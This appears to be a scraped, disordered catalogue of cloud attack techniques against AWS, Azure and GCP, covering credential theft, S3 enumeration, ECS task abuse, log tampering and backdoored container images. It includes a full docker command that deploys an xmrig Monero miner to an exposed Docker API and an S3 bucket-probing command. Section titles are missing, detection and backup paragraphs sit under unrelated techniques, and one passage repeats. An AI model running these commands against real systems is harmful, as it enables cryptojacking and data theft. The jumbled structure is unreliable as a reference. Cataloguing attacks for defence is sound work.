<p><b>Cloud Service Label: PaaS</b></p>

<p>Description</p>
<p>Both AWS and Azure have “serverless” queuing services that enable developers to decouple code elements while enabling a robust and understandable means of passing messages between them. The assumption, however, is that messages in the queue can be trusted because queues can normally only be accessed by trusted internal apps. The Nimbostratus open source tool set has introduced a module that makes it easy to inject malicious commands within an AWS SQS queue if an adversary can gain access to a process that can access the queue. Depending what other hosts are reading from the queue, an adversary could spread laterally or increase his privileges.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Cloud storage repositories like Azure containers and AWS S3 buckets are really convenient places to store code for use by developers who are developing apps within the cloud. They can be also serve out content via HTTPS to allow public consumption of new code. Although often intended as a temporary solution while working on more challenging aspects of code development, storing code in cloud storage can unintentionally be incorporated into production, leaving consumers of this software vulnerable to code modification when a container or bucket is misconfigured. Adversaries can modify code stored in buckets to implant backdoor software to gain a foothold in what would otherwise be a well-protected enclave. If a storage bucket used for hosting code is ever deleted in the future, adversaries can reclaim the bucket name and without any special privileges stage code for unsuspecting people to invoke. This is especially problematic if web servers are pointing at the repo to fetch some forgotten piece of code.</p>

<p><b>Cloud Service Label: PaaS</b></p>

<p>Description</p>
<p>Both AWS and Azure have PaaS offerings for database services that are very popular. Such services can still allow traditional database access using SQL commands from the host running the SQL instance but more interestingly, a REST-based API which enables a richer, less restricted method of controlling the database. Adversaries with some cloud credentials may be able to use this API to access data from the database that more traditional SQL access might prohibit.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.</p>

<p><i>Azure AD</i></p>
<p>In Azure, an adversary can set a password for Service Principals, which is an application specific method of accessing Azure resources. This could facilitate persistence to all Azure services the SP has access to without using an actual user’s credentials. Azure also allows alternative authentication mechanisms such as SAS tokens and certificates to be created and used rather than passwords for Azure services.</p>

<p><i>AWS</i></p>
<p>AWS policies allow trust between user accounts in different AWS accounts by simply identifying an external Amazon account ID and assigning it to a native role within the existing AWS account. It is then up to the cloud admin to notice that this has happened and that the role assigned to the trusted account is permissible.</p>

<p><b>Cloud Service Label: IaaS, P</b><b>aaS</b></p>

<p>Description</p>
<p>Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from compromised users and used in lieu of login credentials. Application credentials may also be stolen from publicly available cloud software repositories where developmental code may still have credentials hardcoded credentials for testing. This is actually quite common and automated tools exist that will scan publicly available repositories for such tokens.</p>

<p>Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application. For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.</p>

<p>Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines.</p>

<p>Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.</p>

Administrators may also block end-user consent through administrative portals, such as by using policies within Azure, disabling users from authorizing third-party apps through OAuth and forcing administrative consent.</p>

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p>The cloud admin portal/API is accessible from any place in the world. By design, all Azure and AWS resources are theoretically accessible from this universal interface. Only identity credentials stand in the way of anyone accessing anyone else’s resources and information. The circumstance is not much improved for unclassified government only clouds, which also widely expose their portal and API and again rely on credentials to arbitrate access.</p>

<p>An adversary may use a portal with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.</p>

<p>Passwords to gain access to the portal/API can be stolen from administrator or privileged user workstations that interact with the portal/API through traditional harvesting techniques like spear phishing. 2FA greatly reduces the chance that such attacks will work. However even with 2FA, it may be possible for adversaries to use the token obtained after 2FA authentication for some brief period of time to gain access to your resources, if they have access to the machine that was granted access by 2FA. Within AWS, other accounts without 2FA may still be granted access to some or all of your resources through IAM roles. The portal/APIs themselves are complex web applications that change constantly. As such they may have intermittent security flaws that enable adversaries to by-pass the credential process and gain access to your resources.</p>

<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data. Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and User Data scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.</p>

<p>If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.</p>

<p>The de facto standard across cloud service providers is to host the Instance Metadata API athttp://169.254.169.254.</p>

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p>Deletion of logs has been a universal technique of adversaries since the dawn of intrusions. Cloud platforms make this practice far more convenient and thorough because most cloud services have a unified interface for accessing and collecting logs from disparate cloud services. With legacy networks it would have required effort for an adversary to determine how a victim was logging each service and where the logs might reside. Logging is now a largely standardized process thanks to Azure and AWS efforts. Adversaries can use cloud provided API’s and logic functions to quickly eliminate problematic log entries. Cloud logs usually leverage standard Cloud object storage which subjects them to data attacks associated with any data stored in Cloud object storage.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>An adversary may attempt to enumerate the cloud security services running on a system after gaining initial access. These services can differ depending on if it's platform-as-a-service (PaaS), or infrastructure-as-a-service (IaaS). Most security aspects of Cloud services are easily viewed and configured from the cloud service dashboard/portal. Even without the ability to change security settings, the ability to read the security configurations of network firewalls, monitoring agents, etc., enable a significantly greater opportunity to defeat these defenses.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>AWS CloudTrail and Azure Monitor logs are often parsed by people with increased rights or accesses. An attacker with limited access to a resource in an AWS/Azure account can craft a name for a request to the API that will certainly fail but will be logged by the cloud API logging service. If a cloud admin exports these logs for example to a spreadsheet in Excel or Google sheets, which is a common practice, the failed API request may actually contain a formula that will be executed inside a spreadsheet.

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Adversaries may be able to use the cloud’s extensive logging capabilities, and the information written to them, as a way to gain information/access to a system. Ultimately, this can lead to the adversary gaining access to user data of a sensitive nature. Logging is essential for many aspects of day to day operations but logging of all information is not always necessary once a system is in production. Some types of log files that can be utilized are server log files, debugging logs, plugin logs, etc.</p>
<p>The Cloud depends on copious logging to make things more transparent to customers who no longer have access to underlying hardware and software layers. The cloud also enables these logs to be distributed to several different locations such as storage accounts, event queues, SIEMS, on premise repositories, etc. Cloud logs can be very informative, telling an adversary what assets are available and how they are protected. Sensitive data may also be exposed in these logs. In Azure for example, Key Vault secrets that would normally be very difficult to obtain may be logged in Logic function logs in the clear by default. The availability and integrity of logs is often stressed by security professionals. The confidentiality of these logs is often not given priority.</p>

<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>It may be possible for an adversary to steal credentials that allow him to create IaaS assets like VM’s without granting him access to a user’s data sources or security services. However, by creating a VM inside a user’s account an adversary may be able to use the new VM as a means of achieving those accesses. New VM’s may be created with default IAM roles or be permitted through firewalls based on their presence within an existing VPC or virtual network.</p>

<p>Detection</p>
<p>Detecting the presence of port-knocking command and control might be possible based on an examination of simple network flow records. In the known exploit, source ports of packets were not increasing monotonically as is the custom from the same IP client. An inspection of flow records from the host would reveal odd behavior as the source ports of packets were jumping around and were both increasing and decreasing by huge amounts in short order.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Adversaries may search local file systems and remote file shares or registries for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. It is possible to extract passwords from backups or saved virtual machines through Credential Dumping.</p>
<p>In cloud environments, authenticated user credentials are often stored in local configuration and credential files. Developers may also embed cloud resource credentials in code to streamline the access of data from a database or file store believing the content all traffic will be contained within the cloud. In some cases, these credentials can be collected and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. In some scenarios adversaries can use credentials found in files to perform lateral movement.</p>

<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>Adversaries may access data objects from improperly secured cloud storage.</p>
<p>Many cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.</p>
<p>Misconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information. Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.</p>

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p><i>Destruction</i></p>
<p>Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such asdelandrmoften only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from<a href="https://attack.mitre.org/techniques/T1488">Disk Content Wipe</a>and<a href="https://attack.mitre.org/techniques/T1487">Disk Structure Wipe</a>because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.</p>
<p>Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.</p>
<p>To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like<a href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a>,<a href="https://attack.mitre.org/techniques/T1003">Credential Dumping</a>, and<a href="https://attack.mitre.org/techniques/T1077">Windows Admin Shares</a>.</p>

<p><i>Encrypted for Impact</i></p>
<p>Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote stores and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted. In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.</p>
<p>To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like<a href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a>,<a href="https://attack.mitre.org/techniques/T1003">Credential Dumping</a>, and<a href="https://attack.mitre.org/techniques/T1077">Windows Admin Shares</a>.</p>

The backup service is PCI and ISO compliant and is HIPAA eligible. There are different backups available: cloud-native (across all AWS services) and hybrid (across AWS and on premise data). To accomplish this a backup plan needs to be created that defines criteria on how to manage the backups (ie. how frequently to backup, how long to keep the backups, etc.), then the resources to backup are assigned. Once the resources are backed up they can be minored, modified, or restored.

There are multiple ways this can be accomplished; through the portal, PowerShell, CLI, and ARM template. From the portal a VM to be backed up can be selected, then enable to backup resource, start the backup job, monitor the backup job, and when you no longer need the deployment it can then be cleared up. Using PowerShell and CLI has the same steps (just accomplished through different commands) first a recovery service vault will be created, then the backup will need to be enabled for the service being backed up, then the backup job will need to be started, then monitored, and lastly clean up the deployment. Lastly, to deploy with the ARM template first the template has to be reviewed and edited as needed, then deploy the template, then the deployment must be validated by starting a backup job, monitoring it, and cleaning up the resources.</p>

<p>Detection</p>
<p>Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories. In some cases, monitoring for unusual kernel driver installation activity can aid in detection. In Azure, monitoring for rest commands sent to the Azure API such as:</p>
<p>Delete https://myaccount.file.core.windows.net/myshare/myparentdirectorypath/mydirectory?restype=directory</p>

<p>This can indicate an attempt to delete multiple files. One place this can be observed is in Azure thru the Activity log blade within the Monitor service.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Cloud Service Providers (CSPs) are constantly adding services and updating their APIs. This situation creates a fair amount of deprecation within the CSP environment. To maintain backwards capability, many of these deprecated API’s still work even after they are no longer officially documented and maintained. Both Azure and GCP as newer more dynamic clouds are especially prone to this phenomenon. Deprecated APIs are likely not to be well integrated with new security logging mechanisms and controls. This offers an adversary who does some research a potential method of interacting with cloud services in a manner that may not be observed or prevented by otherwise strong controls.</p>

<p><b>Cloud Service Label:</b></p>

<p>Description</p>
<p>An adversary may attempt to enumerate the cloud services running on a system after gaining access via credentials or by using publicly accessible API’s to brute force access to cloud resources. Many different services exist throughout the various cloud providers and can include continuous integration and continuous delivery (CI/CD), Lambda Functions, Azure AD, storage etc. Adversaries may attempt to discover information about the services enabled throughout the environment.</p>

<td valign="top" width="312"><p>Pacu, an open source AWS exploitation framework, supports several methods for discovering cloud services. s3_bucket_finder for instance will attempt to guess S3 bucket names and scan for them in every AWS region. If configuration settings are misconfigured, an adversary can even access your S3 bucket with no additional knowledge or credentials. PACU will soon have Azure functionality according to the authors.</p>

ROADrecon Uses an automatically generated metadata model to create an SQLAlchemy backed database on disk. It also uses asynchronous HTTP calls in Python to dump all available information in the Azure AD graph to this database. It gives the ability to provide plugins to query the database and output it to a useful format.</p>

<p><b>Cloud Service Label: PaaS, SaaS, IaaS</b></p>

<p>Docker containers utilized in the cloud can be exploited by an adversary. Azure manages containers via Azure Container Services (ACS) and Amazon manages containers via Amazon Elastic Container Service (Amazon ECS). Depending on how the infrastructure is provisioned, exploiting this could provide privilege escalation, discovery, and exfiltration opportunities.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Adversaries may attempt to exploit the task definitions that are run via Elastic Container Services on AWS.This tactic can be used to exfiltrate information or escalate privileges. ECS is AWS’s container management service which is capable of running, stopping, and managing Docker containers on a cluster.</p>
<p>Task definitions are used to define one or more containers that are to be run and are required to run Docker containers in ECS. A task definition can specify parameters such as which Docker image you want to use, the IAM role to be used, logging configurations, etc.. These task definitions can be exploited to allow for malicious task definitions to be sent.</p>

</td>
<td valign="top" width="312"><p>This blog post outlines an attack where an adversary starts with a low-level role with access to ECS and then finds a task role that has permissions that are elevated to what they need. A task definition is edited to be malicious and run a command to pull a shell script from a server being hosted by the adversary. A shell script payload to exfiltrate credentials is created and then using the AWS CLI is used to run a command that is used to run the malicious task definition, this is done using run-task API. The adversary can then receive exfiltrated credentials and use them to continue attacks.</p>

To create the IAM roles for the task the IAM console will be used. On the console a role will be created for an AWS service (Elastic Container Service). Then the permissions to be given will be applied via Tags. Once the role is created it can be attached to the users needing the permissions.

<p>Detection</p>

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p>The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services.</p>
<p>If an application is hosted on cloud-based infrastructure, then exploiting it may lead to compromise of the underlying instance. This can allow an adversary a path to access the cloud APIs or to take advantage of weak identity and access management policies. It should be assumed that a public web server is a weak link inside a cloud deployment and that some level of compromise is possible. Using Zero Trust principles to isolate the web server to the maximum extent possible inside a cloud deployment will reduce the likelihood of several Cloud tactics and techniques. Docker APIs are commonly exposed publicly and can be used to gain access to a shell on the container, which are also known to run as root by default.</p>

<p>For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.</p>

<p><b>Cloud Service Label: PaaS, SaaS</b></p>

<p>Description</p>
<p>Cloud Service Providers (CSPs) have various services within their cloud environments that can be seamlessly integrated and utilized for a customer’s needs. The purpose of managed cloud services is to remove the need to install and manage common software applications. These managed services move the responsibility of maintaining, patching, and updating to the CSPs and the vendors that provide the managed service.</p>

<p>Managed cloud services can be used at both the infrastructure and application levels. The infrastructure level includes services for providing architecture recommendations, system administration, monitoring, DNS management, Kubernetes support and many others. The application level provides support for packages like Ansible, Elasticsearch, LogStash, database management with MongoDB, and various other services as well.</p>

<p>While managed cloud services are generally thought to be more secure than running a custom or IaaS hosted application or tool, they are still susceptible to vulnerabilities and exploitation and often provide less visibility to customers than comparable IaaS-hosted versions. The Cloud Service Provider will normally remove the worry of vulnerability management through automatic patching and updating, but it is still important to be aware of potential vulnerabilities through managed cloud services, because these could still lead to exploitation of customer assets.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Adversaries may be able to exploit the permissions of S3 buckets to be able to gain access and exfiltrate data. S3 buckets are Amazon’s Simple Storage Services. They are used to store data such as log files, JavaScript libraries, system backups, images, etc.. This service allows users to store and access data easily, but can be an issue if permissions are not configured properly. This can lead to read access, download permissions to anyone who views the bucket, and open upload permissions, both of which can be exploited by an adversary.</p>

</td>
<td valign="top" width="312"><p>In this walkthrough the adversary first finds the region in which they wish to exploit. Once the region is determined they then start to probe for buckets. This is accomplished by general querying and enumeration of bucket names. To determine if a bucket is found that has unfettered access permissions the command, “sudo aws s3 ls s3://$bucketname/ --region $region” can be run with the expectation of returning a directory listing. Once the S3 bucket is identified if an open upload policy can allow an adversary to upload malicious Javascript (or other scripts that are able to perform malicious activity) to all application users. Depending on permissions set buckets can allow for system backups to be downloaded, as well as source code, log files that may contain usernames and passwords, and other critical information. This was tested utilizing Alexa’s top 10,000 sites which resulted in 107 buckets. 57% of the buckets had download permissions to anyone who viewed them, 12% had open upload permissions, and 8% had both permission errors.</p>

<p><b>Cloud Service Label: PaaS</b></p>

<p>Description</p>
<p>Both Azure and AWS employ “serverless” code functionality that can be set to automatically trigger by other events within the cloud API. Coding for these functions is a new paradigm that isn’t well understood from a security perspective. Many of the vulnerabilities associated with other programming paradigms apply but the mitigations often don’t. There really aren’t code scanners that focus on FaaS code. It’s often not feasible to protect FaaS functions with proxies or firewalls. Restricting inputs to FaaS functions is often antithetical to their reason for existing. FaaS functions often take inputs from logs that are not controlled by an application developer. Sample code has already been released showing what is possible if vulnerable FaaS functions ingest log messages that have been cleverly formatted to take advantage of coding vulnerabilities. Exploiting FaaS functions can be used both to gain initial access to a cloud enterprise, collect intelligence on internal cloud assets, to elevate privileges during an existing intrusion, and to evade detection during intrusion.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Kubernetes is becoming extremely popular and due to containers being popular in the cloud this has led to many clients of providers such as GCP, AWS, and Azure utilizing Kubernetes to orchestrate containerized applications. Google Kubernetes Engine (GKE) is Google Cloud Platform’s Kubernetes management system. There are ways that an adversary might exploit GKE to perform privilege escalation.</p>

<td valign="top" width="312"><p>Start with compromised GCP Credentials. Then list compute engine VM instances and log HTTP requests and responses. Then adversary would steal Kubelet bootstrap TLS credentials from the HTTP requests and responses log file that was listed. They would then submit certificate signing request to Kubernetes control plane, act as Kubernetes worker node, and steal Kubernetes secrets with worker node credentials; these steps can be repeated until the adversary is able to gain cluster-admin access. Once the cluster-admin access is gained they can list Kubernetes pods, execute into container, steal container service account, access the computer engine instance meta data server, steal GCP service account token, and access GCP cloud resources.</p>

<p>(version 1.0)</p>

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p>Adversaries may steal the credentials of cloud administrators using well-known credential harvesting techniques.</p>
<p>Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available cloud services, such as cloud storage services. Compromised credentials may also grant an adversary increased privilege to specific cloud systems or resources. Harvested credentials can allow an adversary initial access, the ability to maintain persistence, escalate privileges, move laterally, collect, and exfiltrate data.</p>

Use RBAC to limit the impact anyone account can have on your cloud assets. General “GOD” level accounts that have access to all cloud resources should never be used for daily administration within the cloud. Rather use accounts that have been delegated admin access to certain resources. In Azure for example, using an account with the owner role at the subscription level for everyday tasks is a risky proposition. Once the infrastructure has been created and refined these credentials are no longer required for most admin tasks. Limit credential overlap across systems to prevent access if account credentials are obtained.</p>

Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).</p>
<p>Perform regular audits of cloud accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials, and if any are discovered, they should be updated immediately.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Both Azure and AWS employ IAM functionality that assigns specific resource roles to either users, groups, or service principals in an attempt to limit permissions to only those required to perform required tasks. Using the credentials of any user or service principal, cloud API’s can be used to scan all available roles that may have been assigned. Because of the hundreds/thousands of roles available, administrators may not realize or remember which roles are assigned to whom. Even AWS can get confused, in 2018 AWS released a recommended managed policy that inadvertently allowed any user assigned this role the ability to grant all accesses to all AWS account resources.</p>
<p>Adversaries can use tools such as Pacu to discover obscure role assignments and use these accesses to further infiltrate the cloud infrastructure.</p>

<p><b>Cloud Service Label: IaaS</b></p>

<p>Description</p>
<p>Amazon Web Service (AWS) Amazon Machine Images (AMI), and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored to include malicious code. Depending on how the infrastructure is provisioned, this could provide initial or persistent access.</p>

<p>For example, a publicly accessible tool has been developed to facilitate planting backdoors in AWS Docker container images. If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a web shell. Adversaries may also implant Docker images that may be inadvertently used in cloud deployments especially with cluster management services like Kubernetes. Kubernetes will grab new container images from a configured repository and run them dynamically. If a malicious image makes it into the container registry, an adversary can be reasonably sure it will eventually be run by a newly launched Kubernetes node.</p>

This was done by deploying an Alpine Linux OS container to the exposed Docker API that runs a malicious script from the attackers’ servers and installs a Monero miner. Launching a mining container is as easy as<i>docker -H 192.168.1.7:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig-o POOL01 -o POOL02 -u WALLET -p PASSWORD -k</i></p>

<p>Description</p>
<p>Adversaries may be able to use the cloud’s extensive logging capabilities, and the information written to them, as a way to gain information/access to a system. Ultimately, this can lead to the adversary gaining access to user data of a sensitive nature. Logging is essential for many aspects of day to day operations but logging of all information is not always necessary once a system is in production. Some types of log files that can be utilized are server log files, debugging logs, plugin logs, etc.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Cloud workloads are becoming more and more dependent on Kubernetes. Kubernetes is a complex piece of software with a rich and complex API that can be exposed inadvertently through simple misconfigurations. Even when not misconfigured, it can still introduce access opportunities for attackers. In 2018 (CVE-2018-1002105), the first major vulnerability was reported that could compromise the integrity of an entire Kubernetes cluster due to a flaw in the Kubernetes API. Since then several other flaws have been discovered within the Kubernetes API with varying degrees of severity. The remediation in every case has been to upgrade Kubernetes to the latest version. This however may become more problematic as more cloud workloads rely on Kubernetes clusters to handle workloads with strict uptime requirements. If past is prologue, new critical API vulnerabilities can be expected in the coming years. Similar to the Kubernetes API but distinct is the Kubectl command line utility that can also control a Kubernetes cluster. Key vulnerabilities have begun to be found in this software also that could enable an adversary with some cloud console access to increase his capabilities.</p>

<p><b>Cloud Service Label: PaaS</b></p>

<p>Description</p>
<p>Both Azure and AWS employ “serverless” code functionality that can be set to automatically trigger by other events within the cloud API. Such functionality is often not associated with an avenue for persistence However, it is fairly straightforward for someone with privileges to set up a trigger and a serverless function. In this way an adversary with temporary access could set up a function for example to send a copy of access keys to an outside controlled web address every time a new user account is created. Thus ensuring continued access even after an initial compromise is discovered and remediated. Because serverless code is essentially an ephemeral PaaS service, traditional methods to scan code for vulnerabilities before execution are not very applicable currently.</p>

<p><b>Cloud Service Label: PaaS, IaaS</b></p>

<p>Description</p>
<p>Cloud Service providers like Azure and Google now offer command line interfaces directly from the web console. These interfaces are actually full fledged Docker containers in a CSP-maintained cluster. To avoid bearing the full cost of maintaining these containers, CSP’s place the container images within the customer’s own cloud storage. The Docker image as a result usually remains persistent and enables an adversary with even temporary access to the cloud console to leverage the container environment to place hidden executables and configurations that ensure access can be maintained even after an intrusion supposedly has been remediated. A reverse shell over the web protocol for example from a customer’s container will actually originate from a CSP controlled host and will not be visible in a customer’s logs nor can it be blocked by customer firewall or NSG rules.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Adversaries may attempt to disrupt essential components or systems to prevent the delivering of IT services. Adversaries may leverage native Cloud API functionality to delete resources such as VMs, storage accounts or data bases. They can also use native portal capabilities to remove access accounts’ ability to control Cloud resources. As Amazon and Azure offer more edge integrated services, this disruption could also affect physical device operation and sensor collections.</p>

This is a way to centralize and automate backup services, as well as enforce backup policies that might include aspects such as encryption requirements and audit the activity on the backup. The backup service is PCI and ISO compliant and is HIPAA eligible. There are different backups available: cloud-native (across all AWS services) and hybrid (across AWS and on premise data). To accomplish this a backup plan needs to be created that defines criteria on how to manage the backups (ie. how frequently to backup, how long to keep the backups, etc.), then the resources to backup are assigned. Once the resources are backed up they can be minored, modified, or restored. To get started with this information can be found here:<a href="https://aws.amazon.com/backup/getting-started/"><b>https://aws.amazon.com/backup/getting-started/</b></a><b>.</b>For more information on the service refer here:<a href="https://aws.amazon.com/backup/"><b>https://aws.amazon.com/backup/</b></a><b>.</b>Access to and introduction video can be found here:<a href="https://www.aws.training/Details/Video?id=29646"><b>https://www.aws.training/Details/Video?id=29646</b></a><b>.</b></p>

This allows for on-premises, Azure VMs, Azure file shares, SQL server in Azure VMs, and SAP HANA databases in Azure VMs to be backed up. There are multiple ways this can be accomplished; through the portal, PowerShell, CLI, and ARM template. From the portal a VM to be backed up can be selected, then enable to backup resource, start the backup job, monitor the backup job, and when you no longer need the deployment it can then be cleared up. Using PowerShell and CLI has the same steps (just accomplished through different commands) first a recovery service vault will be created, then the backup will need to be enabled for the service being backed up, then the backup job will need to be started, then monitored, and lastly clean up the deployment. Lastly, to deploy with the ARM template first the template has to be reviewed and edited as needed, then deploy the template, then the deployment must be validated by starting a backup job, monitoring it, and cleaning up the resources.</p>

<p><b>Cloud Service Label: IaaS, PaaS, SaaS</b></p>

<p>Description</p>
<p>Consumers of cloud services and especially IaaS resources have effectively accepted responsibility (liability?) of all such resources. In the public’s view there is little distinction between an organization’s effectiveness and its ability to manage its computing resources. If cloud resources under the purview of an organization are used for malicious or salacious purposes, the damage to intuitional reputation could be immense. HB Gary, a computer security company, suffered severe reputational and financial harm after an affiliate’s website was compromised. Capitol One suffered reputational and financial harm after a former AWS employee compromised thousands of Capitol One customer’s data inside AWS S3 buckets. AWS did not seem to suffer significantly, but Capitol One shares dropped almost 7% because of the incident.</p>
<p>In the cloud, S3 buckets that are controlled by an organization and misconfigured to allow writes can be accessed and used by any third party to store and distribute illicit material and have the organization foot the bill.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Both Azure and AWS have numerous configuration options for security controls and logging that can be altered through their portals or through command line tools. Some of these configurations are subtle and might not be noticed even if people ae actively monitoring API logs such as AWS CloudTrail. An adversary can take advantage of these configurations such as reducing the detail of logging actions. Because most automated analytics depend on raw cloud events, reducing the frequency and detail of these events will necessarily impact the ability of analytics to recognize malicious behavior.</p>

<p><b>Cloud Service Label: IaaS, PaaS</b></p>

<p>Description</p>
<p>Many cloud providers support automated integration of various Continuous Integration/Continuous Deployment tools such as Jenkins, GitLab, Travis CI, or Circle CI. However, there are downsides for faster and more efficient code releases through a CI/CD pipeline. Some include oversight and lack of testing for deployment systems. An attacker who gains permission to these services could add code that as long as it passes quality checks will likely be incorporated in cloud applications allowing code execution with the permissions of the application. Adversaries may even attempt to sign code in an attempt to thwart CI/CD security checks.</p>

<p><b>Cloud Service Label: IaaS</b></p>

<p>Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.</p>
<p>Within cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems. The most frequently targeted services and ports on the cloud are port 22 (SSH) and port 3389 (RDP). Cloud administrators often leave these services open to enable quick remote access to IaaS resources. In Azure by default these ports are open to the world when a VM is first created and need to be purposefully secured after creation.</p>

<p>System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.</p>
